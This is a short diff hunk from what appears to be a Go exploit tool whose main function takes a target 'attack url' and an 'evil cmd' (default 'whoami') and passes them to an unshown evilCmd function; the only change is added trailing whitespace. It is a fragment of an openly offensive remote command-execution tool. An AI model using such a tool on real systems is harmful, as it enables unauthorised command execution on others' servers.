@@ -47,7 +47,7 @@ func evilCmd(url string, cmd string) {
 
 func main() {
 	flag.StringVar(&cmd, "cmd", "whoami", "exec evil cmd")
-	flag.StringVar(&url, "url", "", "select attack url")
+	flag.StringVar(&url, "url", "", "select attack url") 
 	flag.Parse()
 	if len(url) > 0 && len(cmd) > 0 {
 		evilCmd(url, cmd)
